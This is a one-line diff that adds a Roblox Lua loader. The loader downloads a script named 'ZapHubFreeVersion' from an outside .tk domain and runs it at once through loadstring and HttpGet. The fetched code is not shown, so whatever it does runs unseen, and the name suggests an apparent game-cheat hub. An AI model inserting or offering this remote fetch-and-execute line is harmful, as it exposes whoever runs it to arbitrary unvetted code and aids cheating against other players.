@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://itots.tk/zaphub/ZapHubFreeVersion'))()
